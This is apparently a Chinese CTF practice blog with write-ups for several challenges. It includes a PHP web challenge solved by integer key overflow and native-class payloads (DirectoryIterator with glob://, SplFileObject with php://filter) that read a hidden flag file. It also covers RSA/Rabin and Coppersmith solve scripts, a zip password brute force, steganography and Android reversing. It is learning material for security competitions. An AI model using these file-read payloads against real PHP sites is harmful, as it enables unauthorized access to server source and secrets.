# 2月CTF练习



<div class="has-toc have-toc">
</div>

## 0x00 卷王杯-easyweb

核心代码如下

<pre class="wp-block-code"><code>&lt;?php
error_reporting(0);
if(isset($_GET&#91;'source'])){
    highlight_file(__FILE__);
    echo "\$flag_filename = 'flag'.md5(???).'php';";
    die();
}
if(isset($_POST&#91;'a']) && isset($_POST&#91;'b']) && isset($_POST&#91;'c'])){
    $c = $_POST&#91;'c'];
    $count&#91;++$c] = 1;
    if($count&#91;] = 1) {
        $count&#91;++$c] = 1;
        print_r($count);
        die();
    }else{
        $a = $_POST&#91;'a'];
        $b = $_POST&#91;'b'];
        echo new $a($b);
    }
}
?></code></pre>

首先需要绕过`$count[]=1`，这里可以通过数组的key值溢出，设c为`9223372036854775806`。而后传入a和b，通过原生类读取文件。参考：<a href="https://blog.csdn.net/qq_38154820/article/details/121112935" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://blog.csdn.net/qq_38154820/article/details/121112935</a>

先可通过DirectoryIterator类来遍历目录，但只返回迭代器的第一项，利用glob协议看到假的文件

<pre class="wp-block-code"><code>a=DirectoryIterator&b=glob://flag*</code></pre>

但我们知道md5加密后的字符无非是[a-z]和[0-9]，在b=glob://flag*后爆破一位即可得到真实flag的文件。<figure class="wp-block-image size-full">

<img loading="lazy" width="2309" height="712" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/02/图片-1.png" alt="" class="wp-image-5176" /> </figure> 

最后使用SplFileObject类，读取文件内容。构造

<pre class="wp-block-code"><code>a=SplFileObject&b=php://filter/convert.base64-encode/resource=flag56ea8b83122449e814e0fd7bfb5f220a.php</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="2507" height="696" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/02/图片.png" alt="" class="wp-image-5175" /> </figure> 

最后base64解码得到flag。

## 0x01 卷王杯-真·简单·不卷·现代密码签到

```python
n = p * q * r * s * t
e = 2
m = bytes_to_long(os.urandom(500) + flag)
c = pow(m,e,n)

print(p,q,r,s,t,sep='\n')
print(c)

'''
145332367700944303747548912160113939198078051436029477960348968315913956664143693347226702600438608693933768134575289286283267810723137895903153829001826223446477799895493265422562348917012216790077395795861238257357035152687833639085415763850743538206986781418939737511715957738982536382066693822159860701263
116660458253067608044065523310547233337730583902133756095473339390057738510707447906971188577217274861047379404014140178165569604404468897712846876108444468370709141219302291601408652742006268186059762087155933131837323952675627966299810891805398890428420575425160696531236660480933905879208166090591482794763
157931722402853245421436270609912823260313730941283152856444641969403238646482562190531038393124087232554754746464603598717356255570166081501573727336977292059427220330169044611674973569766966838498453232642731737958791706086957762244686953294662693939604300864961637325536379321027705854708492453330690705531
100973451687449518854742673778783266158999451072058606348222018797891147675959983616210003484476577612134482311993701677242007759556951494382833070563369964294544839433671087037596159753825249018950693369209927951667775267086896180395776150188902057785214767230658487267587289809918132337927575673868568976679
93960345071948255233882121683650797512129333868351496468898834736770441398743300745703393838320587998953678254272245400344928586394089488734271897540051673996675973642347859306921527430850673334243441180183460927865980713929789963587608547554858491264614271309608925634272282292964002897650355047792764365447
9144597920381774885442906257311149465702295057238600973973598305004391534618770363098565074541384771979931799878381439264848137810353858418200992191234142740194489573540381681161219332611454834544291634628456257670178843484698324641739324687497388018406214041657278323855749902661752448796122517061920880552011343608609622885787617238758769398972009949575526258430282648817039091284796330585349957724522615105102735930258969562103112238020133587096826386028128471852377225525357348919204333121695432662339443004327748973224423132988376298843862056631045488285859621661802413201793962883794915513510467912312842687601478117040419013468059983777273699192408773551806581458197324620065210523913467414181480875280203580147077789063808832356486197271376615883221558265591069223727607585313240243619515521180600435114131162272519949101464089935441251751426683447701142156416866113627126765919641034042927519834229168536331952275698122511502745177547569813354280565828372968703810158857859460406828090199683324760956105682902577189283246483314689365570862217407333103243336691401424548702387876409228977278498691200028282744239512091373110111792177228979867318546462714521296256938374618636206565791541769138267080789842400796973226733816939794717596194090232425688504890234304977612220790858557639246367437740975495450011676714198668471438814299689325208882261918460708833888406187912527346628912894921059735420931656953236560178909180587372589456926690219114173193202048332172538564489660440225377822914097420807957784201785024166011709377791129
'''
```

分析题目可知公钥n由多素数相乘，e=2是Rabin加密典型特征。核心原理参考：<a rel="noreferrer noopener" href="https://www.ruanx.net/rsa-solutions/" target="_blank" rel="nofollow" >https://www.ruanx.net/rsa-solutions/</a>，本题的难点在于一般rsa的Rabin算法解密都是只有2个素数，这里却有5个，对不熟悉原理的人而言很容易混乱，其实这个考点的本质是对中国剩余定理的理解。写成如下脚本：

<pre class="wp-block-code"><code>def squareMod(c, mod):          # 模意义下开根，找到 x, 使得 x^2 % mod = c
	res = gmpy2.powmod(c, (mod+1)//4, mod)
	return res, mod - res

def format_var(x,p,n):
	Mp = n//p
	return (x*Mp*gmpy2.invert(Mp, p))

def getPlaintext(x, y, z, a, b, p, q, r, s, t,n):   # 假设 m%p=x, m%q=y, 求明文
	res = format_var(x,p,n)+format_var(y,q,n)+format_var(z,r,n)+format_var(a,s,n)+format_var(b,t,n)
	return res % n

def solve(c, p, q,r,s,t,n):            # 已知 p,q,r,s,t, 解密 c
	px = squareMod(c, p)
	py = squareMod(c, q)
	pz = squareMod(c, r)
	pa = squareMod(c, s)
	pb = squareMod(c, t)
	for x in px:
		for y in py:
			for z in pz:
				for a in pa:
					for b in pb:
						yield getPlaintext(x, y, z, a, b, p, q, r, s, t,n)


for msg in solve(c, p, q,r,s,t,n):
	flag = long_to_bytes(msg)
	if b'ctfshow' in flag:
		print(flag)</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="2268" height="496" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/02/图片-2.png" alt="" class="wp-image-5177" /> </figure> 

## 0x02 卷王杯-犯罪高手_签到

<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/02/图片-3.png" alt="" class="wp-image-5178" width="332" height="242" /> </figure> 

可以取钱、查看余额、购买flag，取钱有限制，存钱需要银根。先搜索下日升昌银号，发现存在一个日昇昌密码法则。

<blockquote class="wp-block-quote">
  <p>
    谨防假票冒取 勿忘细视书章
  </p>

  <p>
    堪笑世情薄 天道最公平
  </p>

  <p>
    昧心图自私 阴谋害他人
  </p>

  <p>
    善恶终有报 到头必分明
  </p>

  <p>
    坐客多察看 斟酌而后行
  </p>

  <p>
    国宝流通
  </p>
</blockquote>

顺口溜中的“谨防假票冒取 勿忘细视书章”是代表1至12个月，“堪笑世情薄，天道最公平。昧心图自私，阴谋害他人。善恶终有报，到头必分明”则是表示1至30天。“坐客多察看，斟酌而后行”是银两的1至10，“国宝流通”是万千百两。例如票号在6月10日给某省票号分号汇银3000两，其暗号代码就是“取平多宝通”。

取钱时会出现银根，猜想也是某种顺口溜，多次测试发现。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/02/图片-4.png" alt="" class="wp-image-5179" width="379" height="92" /> </figure> 

<pre class="wp-block-code"><code>10-氏通赵
20-连通赵
30-城通赵
40-壁通赵
99-传通传</code></pre>

搜索关键词得到诗句，`赵氏连城壁，由来天下传`，猜想“国宝流通”依旧代表万千百两。最后，存钱要达到`传国传宝传流传通传`<figure class="wp-block-image size-full">

<img loading="lazy" width="1706" height="1051" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/02/图片-5.png" alt="" class="wp-image-5180" /> </figure> 

## 0x03 HSC-Doraemon

zip密码6位数爆破为376852<figure class="wp-block-image is-resized">

<img loading="lazy" src="https://busy-team-8f5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd26611c0-beef-4bdb-a72b-335f6896482a%2FUntitled.png?table=block&id=0237de6a-eeaf-4fdb-b4df-a8574e6a3216&spaceId=b00e525b-9f57-4a67-b6a8-5ca729392e9e&width=1320&userId=&cache=v2" alt="" width="473" height="202" /> </figure> 

修改图片高度，可以得到一个残缺的二维码，修复下，加上定位符。<figure class="wp-block-image is-resized">

<img loading="lazy" src="https://busy-team-8f5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6932c025-d0a0-471b-841e-707bb38d9bee%2FUntitled.png?table=block&id=7f260e37-7c1e-446a-9b78-fc710e1504ed&spaceId=b00e525b-9f57-4a67-b6a8-5ca729392e9e&width=1010&userId=&cache=v2" alt="" width="256" height="394" /> </figure> 

扫描得到flag<figure class="wp-block-image is-resized">

<img loading="lazy" src="https://busy-team-8f5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F093e3fab-a529-4e4c-921a-835ff7c4a97d%2FUntitled.png?table=block&id=273dd529-8494-4ab5-974d-32a02d0dff81&spaceId=b00e525b-9f57-4a67-b6a8-5ca729392e9e&width=1340&userId=&cache=v2" alt="" width="161" height="160" /> </figure> 

## 0x04 HSC-WIRESHARK

分析zip里面藏了个png，提取出来。<figure class="wp-block-image is-resized">

<img loading="lazy" src="https://busy-team-8f5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F95f88c40-7f4f-4303-8976-a3d753d7eb09%2FUntitled.png?table=block&id=583b6ba5-0daa-4408-987b-6f171d2b15d6&spaceId=b00e525b-9f57-4a67-b6a8-5ca729392e9e&width=2000&userId=&cache=v2" alt="" width="504" height="215" /> </figure> 

接着用Stegsolve提取LSB信息，发现PNG字样<figure class="wp-block-image is-resized">

<img loading="lazy" src="https://busy-team-8f5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Feac7d940-2b70-4d00-b2d5-38bbc520fae4%2FUntitled.png?table=block&id=dbf5ad73-8e05-49be-ac01-b98a94955aa4&spaceId=b00e525b-9f57-4a67-b6a8-5ca729392e9e&width=2000&userId=&cache=v2" alt="" width="551" height="404" /> </figure> 

保存为图片得到一个二维码，扫描结果是`wrsak..iehr370`<figure class="wp-block-image is-resized">

<img loading="lazy" src="https://busy-team-8f5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fea365cb9-5df6-4abf-ab65-3a6eb697408a%2FUntitled.png?table=block&id=027128d2-4337-4188-90fc-82ad7fe61edd&spaceId=b00e525b-9f57-4a67-b6a8-5ca729392e9e&width=500&userId=&cache=v2" alt="" width="132" height="132" /> </figure> 

经过栅栏密码2栏解密，得到`wireshark3.7.0`，就能解开压缩包了，解开的文件二进制内容中发现关键字段类似pdf，修改后缀名为pdf。<figure class="wp-block-image is-resized">

<img loading="lazy" src="https://busy-team-8f5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F5be56a24-1e20-4d39-9780-96dc2b6f8791%2FUntitled.png?table=block&id=7a31120c-c14f-48c2-866b-f91fcf622108&spaceId=b00e525b-9f57-4a67-b6a8-5ca729392e9e&width=2000&userId=&cache=v2" alt="" width="591" height="294" /> </figure> 

010editor分析文件格式，发现文件头残缺，补齐为`255044462D312E`，最后使用wbStego4.3open工具获取隐藏信息<figure class="wp-block-image">

![][1] </figure> 

## 0x05 HSC-android

<figure class="wp-block-image size-full">

<img loading="lazy" width="2039" height="1196" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/02/图片-7.png" alt="" class="wp-image-5184" /> </figure> 

写了个很蠢的脚本，反正能跑出来

<pre class="wp-block-code"><code>v8_1 = &#91;]
v2 = &#91;102, 13, 99, 28, 0x7F, 55, 99, 19, 109, 1, 0x79, 58, 83, 30, 0x4F, 0, 0x40, 42]
for v4 in range(0,18):
	v8_1.append(-1) 

for v4 in range(0,18):
	if (v4 % 2 == 0):
		v8_1&#91;v4] = v2&#91;v4] ^ v4

for v4 in range(0,18):
	if (v4 % 2 != 0):
		if (v8_1&#91;v4] != -1) :
			v8_1&#91;v4+1] = v8_1&#91;v4] ^ v2&#91;v4]
		else:
			if(v4&lt;17 and v8_1&#91;v4+1] != -1):
				v8_1&#91;v4] = v8_1&#91;v4+1] ^ v2&#91;v4]

for i in v8_1&#91;:-1]:
	print(chr(i),end='')</code></pre>

## 0x06 HSC-RSA

```python
import gmpy2
import sympy
from Crypto.Util.number import *

flag = b'????'

z=getPrime(1024)
p=sympy.nextprime(z)
q=sympy.prevprime(10*z)
n=p*q

m=bytes_to_long(flag)
e=0xe18e
c=pow(m,e,n)

print("n=",n)
print("c=",c)

#n= 124689085077258164778068312042204623310499608479147230303784397390856552161216990480107601962337145795119702418941037207945225700624828698479201514402813520803268719496873756273737647275368178642547598433774089054609501123610487077356730853761096023439196090013976096800895454898815912067003882684415072791099101814292771752156182321690149765427100411447372302757213912836177392734921107826800451961356476403676537015635891993914259330805894806434804806828557650766890307484102711899388691574351557274537187289663586196658616258334182287445283333526057708831147791957688395960485045995002948607600604406559062549703501
#c= 57089349656454488535971268237112640808678921972499308620061475860564979797594115551952530069277022452969364212192304983697546604832633827546853055947447207342333989645243311993521374600648715233552522771885346402556591382705491510591127114201773297304492218255645659953740107015305266722841039559992219190665868501327315897172069355950699626976019934375536881746570219967192821765127789432830133383612341872295059056728626931869442945556678768428472037944494803103784312535269518166034046358978206653136483059224165128902173951760232760915861623138593103016278906012134142386906130217967052002870735327582045390117565
```

简单分析下这道题目，p和q之间的关系如下

<pre class="wp-block-code"><code>p = z + a
q = 10*z - b
我们知道p、q都是加减了某个常数

10*p = 10*z + 10*a = 10*z + A
把p放大

10*p - q = A + b = k
得到10*p和q的差为一个常数

设tp = 10 * p
k**2=tp**2 - 2 * tp * q + q**2=(tp)**2 - 2 * t * n + q**2
k**2 + 4 * t *n = tp**2 + 2 * tp * q + q**2</code></pre>

可以通过爆破k值来计算出`tp + q`，从而计算出p和q，脚本如下：

<pre class="wp-block-code"><code>t=10
for k in range(0,1000):
	x = gmpy2.iroot(k**2 + 4 * t * n,2)
	if x&#91;1]:# t*p+q是整数
		p = (x&#91;0] + k)//(2 * t)
		q = t*p - k
		print('p:',p,'\nq:',q)
		break</code></pre>
计算得出p、q

```
p: 111664266924230584310672217327671667710935047973000520430654738129104995948600035802171323708501939460183230462999012738673733788510305174275781562493391778161104978492924899451563162871226400785486072759568388184737567195610022831797165685808940056623572151053130363074869912224709981475153891324423022575151 
q: 1116642669242305843106722173276716677109350479730005204306547381291049959486000358021713237085019394601832304629990127386737337885103051742757815624933917781611049784929248994515631628712264007854860727595683881847375671956100228317971656858089400566235721510531303630748699122247099814751538913244230225750851
```


此时发现`gmpy2.gcd(e,phi)=2`，不能直接用常规解法。

<pre class="wp-block-code"><code>i = gmpy2.gcd(e,phi)
d = gmpy2.invert(e//i,phi)
m = pow(c,d,n)
flag = gmpy2.iroot(m,i)
if flag&#91;1]:
	print(long_to_bytes(flag&#91;0]))</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="776" height="63" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/02/图片-6.png" alt="" class="wp-image-5183" /> </figure> 

## 0x07 HSC-BABYRSA

求出p高位

```python
def lfsr(status,mask):
    out = (status << 1) & 0xffffffff
    i=(status&mask)&0xffffffff
    lastbit=0
    while i!=0:
        lastbit^=(i&1)
        i=i>>1
    out^=lastbit 
    return (out,lastbit)

status= 1
mask = 0b10110001110010011100100010110101

c = list('0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010')

p = ''
for i in range(568):
    (status,out) = lfsr(status,mask)
    p += str(int(c[i])^out)
p = int(p, 2)
print(hex(p))
# 0x807c1395b8128e6de865ab20dd2a39684f6831464553c65215cfe2861192657b6938d227c75e902ae858fdbd8b118c8522c08a3bf978bb203bc1644fe526f2de55b065b0507958
```

已知p高位可以使用Coppersmith Attack方法，但需要至少576位,求出568位,差了2个十六进制数,这里需要爆破，sage代码如下：

```sage
n= 0x4a2c6dd9af83d8cc06b4e721475e9d8a9bce1de6ddd43be7658f13bb5c5b452e9f42d9d77b8c5c3e50ef64e0edc524903e8ee759d805a63cfe613ec022115d54e73724ced3bfff73e1872b7b35b040537f8ac89523d9e2860199d6d0b1c4d7830ee5b468bd7406990ffa29caa2d8fad285b3dba209b34b427d749d7e2aebded78f49e5017bfeec1cb9f72e63506d82af561a4858f652d3fb152526c10c7e4c5e15c84803efac675fb9297d915bd1e2eda5a5de3d48bbf68380303e0d8de81704fff8c9f07ae4d15212b9066227583345425ba7a04e06fd0c16ec6bfdd764318587d1bfe76a9834043b16392018e192456cb3ea994d2a187cabfa706efbee8dbf
p = 0x807c1395b8128e6de865ab20dd2a39684f6831464553c65215cfe2861192657b6938d227c75e902ae858fdbd8b118c8522c08a3bf978bb203bc1644fe526f2de55b065b0507958
import string
dic = string.digits + "abcdef"

for a in dic:
    for b in dic:
        pp = hex(p) + a + b
        #p需要用0补全到1024位
        pp += '0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
        #要加的数字与补全p时0的个数有关
        pp = int(pp, 16)
        p_fake = pp+0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
        pbits = 1024
        kbits = pbits-576
        pbar = p_fake & (2^pbits-2^kbits)
        PR.<x> = PolynomialRing(Zmod(n))
        f = x + pbar
        try:
            x0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root < 2^kbits with factor >= n^0.4
            p = x0 + pbar
            print("p = "+str(p))
        except:
            pass
```

求出p后常规解即可。

[1]: https://busy-team-8f5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F47c8939b-555c-4de1-b4f8-7c55e0e27ad5%2FUntitled.png?table=block&id=03115a6b-3b7f-4b97-b5cc-7fd134127199&spaceId=b00e525b-9f57-4a67-b6a8-5ca729392e9e&width=750&userId=&cache=v2
